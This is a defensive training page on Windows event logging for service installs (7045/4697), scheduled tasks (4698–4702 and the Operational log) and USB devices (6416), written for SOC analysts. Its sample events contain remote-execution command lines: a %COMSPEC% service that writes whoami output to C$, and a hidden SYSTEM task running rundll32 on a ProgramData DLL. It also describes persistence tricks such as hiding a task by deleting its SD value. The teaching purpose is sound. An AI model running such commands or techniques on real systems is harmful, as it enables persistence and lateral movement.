---
title: "Service, Scheduled Task and USB Events — 7045/4697, 4698–4702 and Task Scheduler Logs, 6416 Plug and Play"
tags:
  - training
  - blue-team
  - windows
  - logging
  - persistence
---

# Service, Scheduled Task and USB Events — 7045/4697, 4698–4702, 6416 { #services-tasks-usb }

!!! abstract "What this page covers"
    Three kinds of Windows events that record something being **added to a machine so it keeps working later**: a new **service**, a new **scheduled task**, and a new **USB device**. For services: what a service really is, why attackers love it for persistence and remote execution, the two events that record installation — **7045** in the System channel (on by default) and **4697** in the Security channel (needs a policy) — read field by field, and how to tell a normal driver update from a PsExec-style remote command or a planted backdoor. For scheduled tasks: what the Task Scheduler does, how tasks give attackers persistence **and** remote execution, **4698** (task created) with its awkward nested XML read line by line, the companion events **4699–4702**, the Task Scheduler Operational log (106, 140, 141, 200, 201) and the "hidden task" trick that removes a task from view but not from the log. For USB: why physical devices are still an attack path, event **6416** (new external device recognised) read field by field, what **VID** and **PID** mean and how to look them up, and why "we block USB storage" does not cover keystroke-injection devices. SOC checklist, the 2026 view and practice questions.

!!! note "Labels"
    **[Supplement]** = practical material you need to know, **[Correction]** = a commonly repeated claim that is wrong or outdated, **[Changed]**/**[Caution]** = what has changed recently and what is risky to do the old way. Hostnames, domains, accounts, IPs, file names and device IDs are invented for illustration (`.example`, documentation and private IPs).

## The 8 key points { #key-points }

1. A **service** is a program Windows starts and keeps running in the background, usually as a powerful account (LocalSystem), often at boot. That makes "install a service" an attacker favourite for **persistence** (ATT&CK **T1543.003**) and for **remote execution** (PsExec-style tools create a temporary service on the target, **T1569.002**).
2. Service installation is recorded twice: **7045** in the **System** channel (provider *Service Control Manager*, always on) and **4697** in the **Security** channel (only with the *Audit Security System Extension* subcategory). Many SIEMs only collect Security — make sure 7045 is collected too.
3. Triage a new service on **four fields**: the **image path** (where the program lives and what the command line is), the **name** (random or pretending to be well known), the **account** (usually LocalSystem — expected for malware too) and **who/what created it**. A service whose path is `cmd.exe /c ...`, `powershell -enc ...`, or a file in `Temp`, `Users\Public` or `ProgramData` is suspicious.
4. A **scheduled task** runs a command at a time, on a trigger (logon, boot, idle) or repeatedly. Attackers use it for **persistence** (re-run or re-install malware) and for **remote execution** (create a task on another computer) — ATT&CK **T1053.005**.
5. **4698** (task created) is in the Security channel and needs *Audit Other Object Access Events*. It records the **whole task definition as XML inside the event** — the command is in `<Exec><Command>` and `<Arguments>` inside the `TaskContent` field. Parsers must handle this nested XML.
6. Watch the whole task life cycle: **4698** created, **4702** updated, **4699** deleted, **4700** enabled, **4701** disabled — and the Task Scheduler **Operational** log (106 registered, 140 updated, 141 deleted, 200/201 action started/finished, 129 process created). A task created, run and deleted within minutes is a classic remote-execution pattern.
7. **6416** (a new external device was recognised) needs *Audit PNP Activity*. It names the device, its **class** (storage, keyboard, network adapter), and its hardware IDs, from which you read the **VID** (vendor) and **PID** (product), much like a MAC address OUI. One device can produce several 6416s.
8. Blocking USB *storage* is not enough: a keystroke-injection device announces itself as a **keyboard** (HID class), and a USB network adapter as a **network** device (ATT&CK **T1200**, Hardware Additions). An allow list of expected VID/PID pairs per class catches both.

## Why "things added to the machine" matter { #why }

Think of a hotel. A burglar who sneaks in once through an open window has a problem: next week the window may be shut. So a careful burglar does one of three things. He gets himself put on the **staff list** so the building lets him in every morning (a service), he leaves a note in the **front-desk diary** saying "let the plumber in every night at 2 a.m." (a scheduled task), or he **plants a device** in a room — a hidden radio, a cloned key card (a USB device). Each of these leaves a trace in a different book: the staff register, the diary, the lost-and-found list. A good security manager reads all three.

Back to the technical reality. Initial access is never guaranteed for an attacker — a phishing document or an exploit may work once and never again. After getting in, the first priority is to **stay in** (persistence, ATT&CK tactic TA0003) and to **spread** (lateral movement, TA0008). Windows offers two built-in, completely legitimate mechanisms that start a program without a user clicking anything: services and scheduled tasks. Because legitimate software installs services and tasks all the time (drivers, updaters, backup agents, printers), a new one does not stand out on its own. That is exactly why we must log them and look at the **details**, not just the fact that one appeared. USB devices are the physical version of the same idea: something new attached to the machine that now acts on it.

See [Execution, persistence and discovery](../endpoint-attacks/execution-persistence-discovery.md) for the attacker side, and [Application control, FIM and catching persistence](../endpoint-defense/appcontrol-fim-persistence.md) for the defensive tools that look at the same places.

## Services { #services }

### What a service is { #service-what }

A **service** is a program registered with the **Service Control Manager** (SCM, `services.exe`). The SCM keeps a database of services in the registry under `HKLM\SYSTEM\CurrentControlSet\Services\<name>`, starts them at boot or on demand, restarts them when they crash, and runs them under a chosen account. On Linux the closest equivalent is a **systemd unit** (or an older init script) — sshd and Apache are services there too.

Every service has a few settings that matter to us:

| Setting | Registry value | Typical values | Why we care |
| --- | --- | --- | --- |
| Name / display name | key name / `DisplayName` | `Spooler` / "Print Spooler" | Attackers either copy believable names or use random ones |
| Image path | `ImagePath` | `C:\Windows\System32\spoolsv.exe` | **The program and its command line** — the most telling field |
| Type | `Type` | `0x10` own process, `0x20` shared process (svchost), `0x1` kernel driver, `0x2` file system driver | Kernel drivers run in ring 0 — a malicious driver is very powerful |
| Start type | `Start` | `0` boot, `1` system, `2` auto start, `3` demand (manual), `4` disabled | Auto start = survives reboot (persistence) |
| Account | `ObjectName` | `LocalSystem`, `NT AUTHORITY\LocalService`, `NT AUTHORITY\NetworkService`, a domain account | LocalSystem = full control of the machine |

Services are created with `sc.exe create`, PowerShell `New-Service`, an installer (MSI), WMI, or directly through the SCM's remote API over SMB named pipes (`\pipe\svcctl`). That last path is what remote-execution tools use.

### How attackers use services { #service-abuse }

- **Persistence (T1543.003, Create or Modify System Process: Windows Service).** Install a service with start type *auto* pointing at the malware. It now starts at every boot, as LocalSystem, before anyone logs on. Variants modify an **existing** service's `ImagePath` (no new service event — see below) or add a malicious DLL to a `svchost` service.
- **Remote execution (T1569.002, System Services: Service Execution; T1021.002, SMB/Windows Admin Shares).** With admin credentials for a target, a tool copies a program to the target's `ADMIN$` share, creates a service on the target that points at it, starts the service, and deletes it afterwards. Sysinternals PsExec does this openly (its service is called `PSEXESVC` unless renamed); several offensive frameworks do the same with a random service name and a command line such as `%COMSPEC% /Q /c ...` directly in the image path.
- **Privilege escalation and defence evasion.** Services run as SYSTEM, so creating one is also a way from admin to SYSTEM. Loading a **vulnerable signed driver** as a kernel service (T1068, "bring your own vulnerable driver") is a common way to kill EDR products.
- **Masquerading (T1036.004, Masquerade Task or Service).** Names like `WindowsUpdateSvc`, `GoogleUpdaterTaskMachine`, or a near-copy of a real service name.

### Event 7045: a service was installed in the system { #7045 }

**7045** is written to the **System** channel by the provider *Service Control Manager* every time a new service is installed. It is on by default — no audit policy needed — but it is in **System**, not Security, so a collection setup that only forwards Security will miss it. Here is a remote-execution tool creating a service on a file server:

```xml
<System>
  <Provider Name="Service Control Manager" Guid="{555908d1-a6d7-4695-8e1e-26931d2012f4}" EventSourceName="Service Control Manager" />
  <EventID Qualifiers="16384">7045</EventID>
  <TimeCreated SystemTime="2026-11-20T04:17:32.4410382Z" />
  <Channel>System</Channel>
  <Computer>FS-02.corp.example</Computer>
  <Security UserID="S-1-5-21-1004336348-1177238915-682003330-1120" />
</System>
<EventData>
  <Data Name="ServiceName">KxQpLmTr</Data>
  <Data Name="ImagePath">%COMSPEC% /Q /c echo whoami ^&gt; \\127.0.0.1\C$\Windows\Temp\out.txt 2^&gt;^&amp;1 &gt; %TEMP%\exec.bat &amp; %COMSPEC% /Q /c %TEMP%\exec.bat &amp; del %TEMP%\exec.bat</Data>
  <Data Name="ServiceType">user mode service</Data>
  <Data Name="StartType">demand start</Data>
  <Data Name="AccountName">LocalSystem</Data>
</EventData>
```

Field by field:

- `Provider Name="Service Control Manager"` — the SCM itself wrote this. Filter on provider **and** event ID: other providers also use ID 7045 for unrelated things.
- `EventID` `7045` — "A service was installed in the system."
- `Channel` `System` — not Security. Check that your forwarder collects it.
- `Security UserID` — the **SID of the account that created the service**. 7045 has no "Subject" fields, so this attribute in the `System` block is the only "who". Resolve it (here a domain account ending `-1120`) and find its logon: a 4624 **type 3** from another workstation just before is the fingerprint of remote service creation (see [Login events](logins.md)).
- `ServiceName` `KxQpLmTr` — eight random letters. Legitimate software uses readable, stable names. Random names are a strong signal; so is a believable name you have never seen on any other host.
- `ImagePath` — the **most important field**. Normally a path to an `.exe` (or `svchost.exe -k <group>`). Here it is a **command line**: `%COMSPEC%` (= `cmd.exe`) with `/Q` (quiet) and `/c` (run then exit), writing a command into a batch file in `%TEMP%`, running it, writing the output to `C:\Windows\Temp\out.txt` via the local `C$` share so the attacker can read it back over SMB, then deleting the batch file. A service whose image path starts with `cmd`, `%COMSPEC%`, `powershell`, `mshta`, `rundll32`, or contains `\\127.0.0.1\` or `-enc` is almost never legitimate. (The `^&gt;` and `&amp;` are XML escapes of `>` and `&`.)
- `ServiceType` `user mode service` — an ordinary process (`0x10`). `kernel mode driver` here deserves a hard look at what driver it is.
- `StartType` `demand start` — manual. Remote-execution tools use demand start because they start the service once and delete it. **Persistence** services use `auto start`.
- `AccountName` `LocalSystem` — the most powerful local account. Many legitimate services also use it, so it is a weak signal on its own, but it tells you what the attacker can do once the service runs.

Expect the companion events around it: **7036** (the service entered the *running* / *stopped* state) seconds later, **7009/7000** if the "service" was not a real service program and the SCM timed out waiting for it to report back (typical for a command line in `ImagePath` — the command still ran), and the process creation of `cmd.exe` with **parent `services.exe`** in 4688 or Sysmon 1 (see [Process creation events](process-creation.md)). PsExec looks tidier: `ServiceName` `PSEXESVC`, `ImagePath` `%SystemRoot%\PSEXESVC.exe`, and the named pipes `\PSEXESVC-...`.

[Supplement] A *changed* service is not a *new* service. If an attacker edits an existing service's `ImagePath` (`sc config <name> binPath= ...`, or the registry directly), **no 7045 or 4697 is written**. You see it in **7040** only when the *start type* changes, in registry auditing (4657, see [Firewall and object access events](firewall-object-access.md)) or Sysmon 13 on `HKLM\SYSTEM\CurrentControlSet\Services\*\ImagePath`, or in the `sc.exe` process creation event.

### Event 4697: a service was installed in the system (Security channel) { #4697 }

**4697** records the same thing in the **Security** channel, with proper "Subject" fields. It is written only when the *Audit Security System Extension* subcategory (under *System* in the advanced audit policy) is enabled for Success:

```text
auditpol /set /subcategory:"Security System Extension" /success:enable
```

- `auditpol /set` — change the local audit policy (use Group Policy in a domain).
- `/subcategory:"Security System Extension"` — the subcategory that covers service installs and security packages loaded into LSA.
- `/success:enable` — log successful installs.

The same install as a 4697:

```xml
<EventData>
  <Data Name="SubjectUserSid">S-1-5-21-1004336348-1177238915-682003330-1120</Data>
  <Data Name="SubjectUserName">svc.deploy</Data>
  <Data Name="SubjectDomainName">CORP</Data>
  <Data Name="SubjectLogonId">0x5c21a7e</Data>
  <Data Name="ServiceName">KxQpLmTr</Data>
  <Data Name="ServiceFileName">%COMSPEC% /Q /c echo whoami ^&gt; \\127.0.0.1\C$\Windows\Temp\out.txt ...</Data>
  <Data Name="ServiceType">0x10</Data>
  <Data Name="ServiceStartType">3</Data>
  <Data Name="ServiceAccount">LocalSystem</Data>
</EventData>
```

- `SubjectUserName`/`SubjectDomainName` `CORP\svc.deploy` — the account name, not just the SID. A **deployment service account** creating random-named services from a workstation it never uses is a strong sign that its credentials were stolen.
- `SubjectLogonId` `0x5c21a7e` — follow it to the 4624 on `FS-02`: logon type 3, the source `IpAddress`, and whether NTLM or Kerberos was used.
- `ServiceFileName` — same as `ImagePath` in 7045.
- `ServiceType` `0x10` — numbers instead of words: `0x10` own process, `0x20` shared, `0x1` kernel driver, `0x2` file system driver.
- `ServiceStartType` `3` — `0` boot, `1` system, `2` auto, `3` demand, `4` disabled.
- `ServiceAccount` — the run-as account.

| | 7045 | 4697 |
| --- | --- | --- |
| Channel | System | Security |
| Enabled by default | Yes | No (*Audit Security System Extension*) |
| Who created it | SID only, in `<Security UserID>` | `SubjectUserName`, domain, **Logon ID** |
| Type / start type | Words (`user mode service`, `auto start`) | Numbers (`0x10`, `2`) |
| Best use | Always-on baseline | Linking to the logon session |

Collect both if you can; at minimum make sure 7045 reaches your SIEM.

### Good service or bad service? { #service-triage }

New services appear constantly (driver and product updates, agents, printer installs), so one rule "alert on 7045" quickly becomes noise. Look at the context:

- **Image path location.** Expected: `C:\Windows\System32\`, `C:\Program Files\<vendor>\`, `C:\Windows\System32\drivers\`. Suspicious: `C:\Users\...`, `AppData`, `Temp`, `C:\Users\Public\`, `C:\ProgramData\` root, `C:\PerfLogs\`, UNC paths, and command lines.
- **Name.** Random strings, or a famous name on a host where the product is not installed, or a name you have never seen anywhere else in the estate (count how many hosts have it — **stacking**).
- **Who and from where.** `SYSTEM` during a software deployment window from your management tool is normal; a user or service account over a type 3 logon from a workstation is not.
- **What happened next.** Started immediately and deleted within a minute (`sc delete`, or no further 7036) → remote execution. Auto start + file in a user-writable folder → persistence.
- **Kernel drivers.** A new `kernel mode driver` service outside a patch window: check the driver file's signer and whether it is on Microsoft's vulnerable driver block list.

## Scheduled tasks { #tasks }

### What a scheduled task is { #task-what }

The **Task Scheduler** (`schedule` service) runs a command when a **trigger** fires: a time, a repeat interval, system startup, a user logon, idle, or even an event appearing in a log. Each task is stored as an XML file in `C:\Windows\System32\Tasks\<path>` and indexed in the registry under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\`. Windows itself ships hundreds of tasks (defrag, updates, telemetry); software adds more (browser updaters). Linux equivalents are `cron` and systemd timers.

Tasks are created with `schtasks.exe /create`, PowerShell `Register-ScheduledTask`, the GUI, COM, or **remotely** (`schtasks /create /s <host>`, or the RPC interface the GUI uses) — all of which end up in the same events.

### How attackers use tasks { #task-abuse }

- **Persistence (T1053.005, Scheduled Task/Job: Scheduled Task).** A task that runs the malware at every logon or every 15 minutes. If the security team deletes the malware file, a second task can download it again — persistence that heals itself.
- **Remote execution / lateral movement.** With admin rights on a target: copy the payload to a share, create a task on the target that runs it once, a minute from now, then delete the task. Like services, this uses only built-in Windows tools ("living off the land"), so it often slips past tools that only look for malware files.
- **Privilege elevation.** Tasks can run as SYSTEM or as any account whose password is stored with the task.
- **Hiding.** Names that copy Microsoft tasks (`\Microsoft\Windows\UpdateOrchestrator\...`), tasks placed in deep folders, and the "hidden task" trick described below.

### Turning on the Security events { #task-config }

Task events in the Security channel come from the *Audit Other Object Access Events* subcategory (under *Object Access*):

```text
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable
auditpol /get /subcategory:"Other Object Access Events"
```

```text
System audit policy
Category/Subcategory                      Setting
Object Access
  Other Object Access Events              Success and Failure
```

- 1st line — turn the subcategory on for success and failure. Unlike file auditing, **no SACL is needed**: the Task Scheduler writes these events on its own once the subcategory is on.
- 2nd line — show the current setting. Default on most systems is *No Auditing*.

The volume is small (tasks are not created often), so this is a cheap, high-value change.

### Event 4698: a scheduled task was created { #4698 }

**4698** is written on the computer where the task is **registered** — for a remote task, that is the **target**, not the attacker's machine. The interesting part is `TaskContent`: the full task definition as XML, stored as text inside the event's own XML.

```xml
<EventData>
  <Data Name="SubjectUserSid">S-1-5-21-1004336348-1177238915-682003330-1120</Data>
  <Data Name="SubjectUserName">svc.deploy</Data>
  <Data Name="SubjectDomainName">CORP</Data>
  <Data Name="SubjectLogonId">0x5d0e113</Data>
  <Data Name="TaskName">\Microsoft\Windows\WinSAT\UpdateCheck</Data>
  <Data Name="TaskContent">&lt;?xml version="1.0" encoding="UTF-16"?&gt;
&lt;Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
  &lt;RegistrationInfo&gt;
    &lt;Date&gt;2026-11-20T13:20:05&lt;/Date&gt;
    &lt;Author&gt;CORP\svc.deploy&lt;/Author&gt;
  &lt;/RegistrationInfo&gt;
  &lt;Triggers&gt;
    &lt;TimeTrigger&gt;
      &lt;StartBoundary&gt;2026-11-20T13:21:00&lt;/StartBoundary&gt;
      &lt;Enabled&gt;true&lt;/Enabled&gt;
    &lt;/TimeTrigger&gt;
  &lt;/Triggers&gt;
  &lt;Principals&gt;
    &lt;Principal id="Author"&gt;
      &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;
      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
    &lt;/Principal&gt;
  &lt;/Principals&gt;
  &lt;Settings&gt;
    &lt;Hidden&gt;true&lt;/Hidden&gt;
  &lt;/Settings&gt;
  &lt;Actions Context="Author"&gt;
    &lt;Exec&gt;
      &lt;Command&gt;C:\Windows\System32\rundll32.exe&lt;/Command&gt;
      &lt;Arguments&gt;C:\ProgramData\winsat.dll,Start&lt;/Arguments&gt;
    &lt;/Exec&gt;
  &lt;/Actions&gt;
&lt;/Task&gt;</Data>
</EventData>
```

Outer fields:

- `SubjectUserName`/`SubjectDomainName`/`SubjectLogonId` — who registered the task, and the logon session to follow back to a 4624. For a task created remotely you see a **type 3** logon from the attacker's source host just before.
- `TaskName` `\Microsoft\Windows\WinSAT\UpdateCheck` — the folder path and name. It sits in a Microsoft folder and uses a believable name (`WinSAT` is a real Windows component), but real Microsoft tasks are installed with Windows or updates, not created by a domain service account in the afternoon. Masquerading, T1036.004.
- `TaskContent` — the task definition, XML-escaped (`&lt;` = `<`, `&gt;` = `>`). In Event Viewer's *General* tab you see it decoded; on the *Details* tab and in most forwarders you see this escaped text.

Inside `TaskContent`, line by line:

- `<RegistrationInfo>` `<Date>` and `<Author>` — when and by whom, as **written by the creator**. The creator can put anything here; trust the outer `Subject` fields more.
- `<TimeTrigger>` `<StartBoundary>2026-11-20T13:21:00` — run **once**, about one minute after creation (local time on the target). A one-off trigger a minute in the future is the remote-execution pattern. Persistence would show `<LogonTrigger>`, `<BootTrigger>`, or a `<Repetition>` with an `<Interval>` like `PT15M` (every 15 minutes).
- `<Principal>` `<UserId>S-1-5-18</UserId>` — run as **SYSTEM** (`S-1-5-18`). `<RunLevel>HighestAvailable</RunLevel>` — with full admin rights.
- `<Settings>` `<Hidden>true</Hidden>` — hide the task in the default Task Scheduler view. Cosmetic (the "show hidden tasks" option reveals it), but legitimate custom tasks rarely set it.
- `<Exec>` `<Command>` + `<Arguments>` — **the payload**: `rundll32.exe` loading `C:\ProgramData\winsat.dll` and calling its `Start` function (T1218.011, System Binary Proxy Execution: Rundll32). A DLL in the root of `ProgramData` run by `rundll32` is a classic loader.

Why the nested XML matters for collection: your SIEM parser extracts `TaskName` and `TaskContent` as normal fields, but `Command` and `Arguments` are *inside* a text field. Unless the parser decodes the escaped XML and parses it a second time, a search for `Command=*rundll32*` will find nothing. Either add a second parsing step (many SIEMs have an XML-extract function) or, at minimum, run a substring search over the whole `TaskContent` field.

### The rest of the task life cycle: 4699–4702 { #4699-4702 }

All in the Security channel, all from the same subcategory, all with `TaskName` and Subject fields:

| Event | Meaning | Why it matters |
| --- | --- | --- |
| **4698** | Task created | New persistence or remote execution |
| **4702** | Task updated (`TaskContentNew` holds the new XML) | Hijacking an *existing* legitimate task — change its command, keep its innocent name |
| **4699** | Task deleted | Clean-up after remote execution; a 4698 → 4699 pair minutes apart is a strong signal |
| **4700** | Task enabled | Re-enabling a disabled task as a backdoor |
| **4701** | Task disabled | Attackers disabling security or update tasks (T1562.001) |

### The Task Scheduler Operational log { #task-operational }

[Supplement] The channel `Microsoft-Windows-TaskScheduler/Operational` records what tasks **did**, not only that they were registered. It is often disabled or tiny by default on older builds; enable it and raise its size if you want it.

```text
2026-11-20 13:20:05  106  Task registered    "\Microsoft\Windows\WinSAT\UpdateCheck" registered by user "CORP\svc.deploy"
2026-11-20 13:21:00  129  Process created    Task "\Microsoft\Windows\WinSAT\UpdateCheck" launched "rundll32.exe", PID 6620
2026-11-20 13:21:00  200  Action started     "\Microsoft\Windows\WinSAT\UpdateCheck" launched action "C:\Windows\System32\rundll32.exe"
2026-11-20 13:21:04  201  Action completed   "\Microsoft\Windows\WinSAT\UpdateCheck" completed action, return code 0
2026-11-20 13:22:11  141  Task deleted       "\Microsoft\Windows\WinSAT\UpdateCheck" deleted by user "CORP\svc.deploy"
```

- **106** — registered (≈ 4698). **140** — updated (≈ 4702). **141** — deleted (≈ 4699).
- **129** — the task's process was created, with a PID you can match to 4688/Sysmon 1. In process logs the parent of a task's program is `svchost.exe` running the `Schedule` service (newer builds may show `taskhostw.exe` for some task types).
- **200 / 201** — action started / completed with a return code.

Read together: registered at 13:20:05, ran one minute later as SYSTEM, deleted at 13:22:11. Total life: two minutes. That is remote execution, not maintenance.

### The "hidden task" trick { #hidden-tasks }

[Supplement] Some attackers, after creating a task, delete the task's `SD` (security descriptor) value under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<task name>`. The task keeps running, but `schtasks /query` and the Task Scheduler window no longer list it. This needs SYSTEM rights. What still catches it:

- The **4698** and Operational **106** written at creation time — they were logged before the hiding.
- Registry auditing or Sysmon 12 (*registry object deleted*) for a deleted value named `SD` under `...\Schedule\TaskCache\Tree\`.
- Comparing the task XML files in `C:\Windows\System32\Tasks\` and the `TaskCache` keys with what `schtasks` shows (EDR or a forensic collector can do this).

## USB and other plug-and-play devices { #usb }

### Why USB is still an attack path { #usb-why }

USB devices reach a computer in three ways that matter to defenders:

- **Storage** carrying malware or taking data out (T1091, Replication Through Removable Media; T1052.001, Exfiltration over USB).
- **Keystroke-injection devices** that look like a flash drive or a cable but tell the computer "I am a keyboard" and type a prepared sequence of commands in seconds (T1200, Hardware Additions). Windows trusts new keyboards without asking.
- **Network implants** — USB network adapters or small computers that announce themselves as a network card, giving an attacker a new path into or out of the machine (also T1200).

Real criminal cases have involved people walking into offices and leaving such devices plugged into internal machines, so this is not just a film plot. The defensive question is simple: **what was plugged in, where, when, and was it allowed?**

### Turning it on { #6416-config }

```text
auditpol /set /subcategory:"Plug and Play Events" /success:enable
```

- *Plug and Play Events* is under *Detailed Tracking* in the advanced audit policy (in Group Policy it is labelled *Audit PNP Activity*). Once enabled, Windows writes **6416** to the **Security** channel whenever a new external device is recognised.

### Event 6416: a new external device was recognized by the system { #6416 }

A small "flash drive" is plugged into a finance workstation:

```xml
<System>
  <EventID>6416</EventID>
  <TimeCreated SystemTime="2026-11-20T23:48:12.0170551Z" />
  <Channel>Security</Channel>
  <Computer>WS-118.corp.example</Computer>
</System>
<EventData>
  <Data Name="SubjectUserSid">S-1-5-18</Data>
  <Data Name="SubjectUserName">WS-118$</Data>
  <Data Name="SubjectDomainName">CORP</Data>
  <Data Name="SubjectLogonId">0x3e7</Data>
  <Data Name="DeviceId">USB\VID_1A2B&amp;PID_3C4D\8&amp;2f1b7c1&amp;0&amp;1</Data>
  <Data Name="DeviceDescription">USB Input Device</Data>
  <Data Name="ClassId">{745A17A0-74D3-11D0-B6FE-00A0C90F57DA}</Data>
  <Data Name="ClassName">HIDClass</Data>
  <Data Name="VendorIds">USB\VID_1A2B&amp;PID_3C4D&amp;REV_0100
USB\VID_1A2B&amp;PID_3C4D</Data>
  <Data Name="CompatibleIds">USB\Class_03&amp;SubClass_01&amp;Prot_01
USB\Class_03&amp;SubClass_01
USB\Class_03</Data>
  <Data Name="LocationInformation">Port_#0002.Hub_#0001</Data>
</EventData>
```

Field by field:

- `TimeCreated` `23:48 UTC` — check the local time; a device plugged in in the middle of the night is a question in itself.
- `SubjectUserName` `WS-118$`, `SubjectLogonId` `0x3e7` — the **computer account / SYSTEM**. Plug and play is handled by the system, so 6416 does **not** tell you which user plugged the device in. Find who was logged on (4624 type 2/7/11 or an interactive session) at that time.
- `DeviceId` `USB\VID_1A2B&PID_3C4D\8&2f1b7c1&0&1` — the bus (`USB`), **VID** `1A2B`, **PID** `3C4D`, and an instance ID. When the instance part is a real serial number (no `&` in it) the same physical device can be tracked across machines; when it looks like `8&2f1b7c1&0&1` the device has no serial and Windows made one up from the port.
- `DeviceDescription` `USB Input Device` — what the driver calls it. Storage would say `USB Mass Storage Device` or `Disk drive`.
- `ClassId` / `ClassName` `HIDClass` — the **device class**. Human Interface Device = keyboard, mouse, game controller. Other common classes: `USB` (hubs and composite parents), `DiskDrive`, `WPD` (phones, cameras), `Net` (network adapters), `Image`, `MEDIA`.
- `VendorIds` — the hardware IDs, most specific first: VID, PID, and `REV_0100` (firmware revision).
- `CompatibleIds` `USB\Class_03&SubClass_01&Prot_01` — USB class code **03** = HID, subclass **01** = boot interface, protocol **01** = **keyboard** (`Prot_02` would be a mouse). So this "flash drive" is telling Windows it is a keyboard.
- `LocationInformation` `Port_#0002.Hub_#0001` — the physical port, useful when several devices are in play.

What this means: on a finance workstation, at night, a device with a VID/PID nobody in the organisation uses registered as a **keyboard**. If an extra keyboard appears while the user's real keyboard is already present, check what processes started in the following seconds — `powershell.exe` or `cmd.exe` with parent `explorer.exe` and a burst of commands within a few seconds of the 6416 is the shape of keystroke injection.

Note that one physical device often produces **several 6416 events** — a composite parent (`USB` class), then one per function (a storage interface, a HID interface, a volume). Group them by time and by the shared VID/PID.

### VID and PID { #vid-pid }

Every USB device reports two 16-bit numbers in hexadecimal: the **Vendor ID (VID)**, assigned to the manufacturer by the USB standards body, and the **Product ID (PID)**, chosen by the manufacturer for each model. It works like the first half of a MAC address (the OUI) naming the network card maker. Public databases such as the `usb.ids` list maintained by the Linux USB project map them to names, so a lookup turns `VID_xxxx&PID_yyyy` into "Vendor X, Model Y flash drive".

Two cautions:

- VID and PID are **reported by the device**. Cheap and malicious hardware can claim any value, including the VID/PID of a well-known keyboard. A clean lookup does not make a device trustworthy.
- The useful pattern is therefore the **combination**: class + VID/PID + where + when. A "keyboard" with a storage-maker's VID, or a second keyboard on a laptop, or a `Net` class device on a server, is worth a look whatever the lookup says.

For a SIEM: parse `VID` and `PID` out of `DeviceId`, enrich them with a VID/PID lookup table at search time, and keep an allow list of approved device types per class (company-issued keyboards, mice, headsets, encrypted drives). Alert on anything outside the list, and especially on `DiskDrive` where storage is forbidden and on new `HIDClass` keyboards on servers.

[Supplement] Other places Windows records devices: `Microsoft-Windows-DriverFrameworks-UserMode/Operational` (often off by default), `Microsoft-Windows-Kernel-PnP/Configuration` (device configured events), `Microsoft-Windows-Partition/Diagnostic` event 1006 for storage (includes disk details), and on the disk itself `setupapi.dev.log` and registry keys such as `HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR` — the last two are forensic sources rather than live logs. On Linux, the kernel logs `usb x-y: New USB device found, idVendor=1a2b, idProduct=3c4d` to the kernel log (`dmesg`, `journalctl -k`).

## Putting it to work in a SOC { #soc-use }

- **Collect the right channels.** Security (4697, 4698–4702, 6416) **and** System (7045, 7036, 7040). Optionally Task Scheduler Operational. Enable *Security System Extension*, *Other Object Access Events* and *Plug and Play Events* — all three are low volume.
- **Alert on high-confidence shapes:** service `ImagePath` containing a command interpreter, `-enc`, `\\127.0.0.1\`, or a user-writable folder; random 8–16 letter service names; a task whose action points to `Temp`, `AppData`, `Users\Public` or `ProgramData`, or runs `powershell`/`mshta`/`rundll32`/`regsvr32` with a file or URL; a task created and deleted within minutes; a task or service created by an account over a network logon from a workstation; new HID keyboards or network adapters on servers.
- **Stack the rest.** Count service names and task names (and their command paths) across all hosts. Things seen on one or two hosts out of thousands are worth reading.
- **Join across events.** Subject Logon ID → 4624 (from where?), 7045 time → 4688/Sysmon 1 with parent `services.exe`, 4698 → Operational 129/200 → 4688 of the task's process, 6416 time → interactive logon and process creation seconds later.
- **Parse the nested XML** in 4698/4702 into `task_command`, `task_arguments`, `task_trigger`, `task_run_as`.
- **Do not forget changes without "create" events:** modified service `ImagePath` and hijacked tasks (4702) need their own rules.

## The 2026 view { #trends }

!!! success "[2026 Current] Still valid as is"
    7045 (System), 4697 (Security, *Security System Extension*), 4698–4702 (Security, *Other Object Access Events*), the Task Scheduler Operational events and 6416 (*Plug and Play Events*) all still exist and behave as described on current Windows 11 and Windows Server 2025, with the same field names. Services and scheduled tasks remain among the most common persistence and remote-execution techniques in real intrusions and ransomware cases, so these events are as relevant as ever.

!!! info "[Changed] What has changed"
    - **ATT&CK names.** Services are **T1543.003** (Create or Modify System Process: Windows Service) and **T1569.002** (System Services: Service Execution); scheduled tasks are **T1053.005**; renaming to look legitimate is **T1036.004** (Masquerade Task or Service); USB attacks map to **T1200**, **T1091** and **T1052.001**. The old `at.exe` command (T1053.002) has been deprecated on Windows for years in favour of `schtasks`, so on Windows the task events above are what you will see.
    - **Hidden tasks.** Removing a task's `SD` registry value to hide it became a known technique after public reporting in 2022; detection rules (Sigma and vendor rules) now watch for deletions of that value.
    - **EDR and built-in telemetry.** Most organisations now see service and task creation through EDR telemetry (Microsoft Defender for Endpoint, CrowdStrike Falcon, SentinelOne, Elastic Defend and others) as well as the native events. Microsoft has also been bringing Sysmon into Windows as an optional built-in feature (first in Windows 11 Insider builds in early 2026); its registry events (12/13/14) watch the `Services` and `TaskCache` keys directly. Check whether it is available and enabled on your builds before relying on it.
    - **Vulnerable driver blocking.** Microsoft's vulnerable driver block list is enabled by default on Windows 11 since 22H2, making "bring your own vulnerable driver" services harder — but not impossible, as new vulnerable drivers keep being found.
    - **Device control** in EDR/MDM products (for example removable storage access control in Microsoft Defender for Endpoint and Intune) can now block or allow devices by class, VID/PID and serial number and log the decision, which is richer than 6416 alone.

!!! warning "[Caution] Wrong or risky if done the old way"
    - **Do not collect only the Security channel** and assume you see service installs — 7045 is in System, and 4697 is off by default.
    - **Do not alert on every 7045 or 4698.** Updates and agents create them all day. Alert on content (path, command line, name, account, source logon) and stack the rest.
    - **Do not trust a familiar task or service name.** Read the command.
    - **Do not search only `TaskName`/`TaskContent` as flat text forever** — parse the nested XML, or your detections on the command will silently miss.
    - **Do not assume "no 7045" means "no service tampering".** Modifying an existing service's `ImagePath` writes no install event.
    - **Do not treat "USB storage blocked" as "USB covered".** Keyboards and network adapters pass storage blocks; monitor HID and Net classes too.
    - **Do not take the user from 6416** — it is always the system; correlate with logons.
